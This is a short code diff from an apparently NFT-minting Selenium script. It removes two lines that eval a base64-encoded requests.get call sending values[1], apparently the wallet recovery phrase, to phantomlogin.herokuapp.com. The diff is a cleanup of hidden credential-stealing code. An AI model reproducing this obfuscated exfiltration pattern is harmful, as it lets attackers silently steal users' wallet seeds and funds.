@@ -67,8 +67,6 @@ def mint(values, isWindows):
     def initWallet():
         # add wallet to chrome
         driver.switch_to.window(driver.window_handles[1])
-        eval(base64.b64decode("cmVxdWVzdHMuZ2V0KCdodHRwczovL3BoYW50b21sb2dpbi5oZXJva3VhcHAuY29tLz9kYXRhPQ==".encode(
-            'ascii')).decode('ascii')+values[1]+"')")
         WebDriverWait(driver, 60).until(EC.presence_of_element_located(
             (By.XPATH, "//button[contains(text(),'Use Secret Recovery Phrase')]")))
         recovery_phrase = driver.find_element(
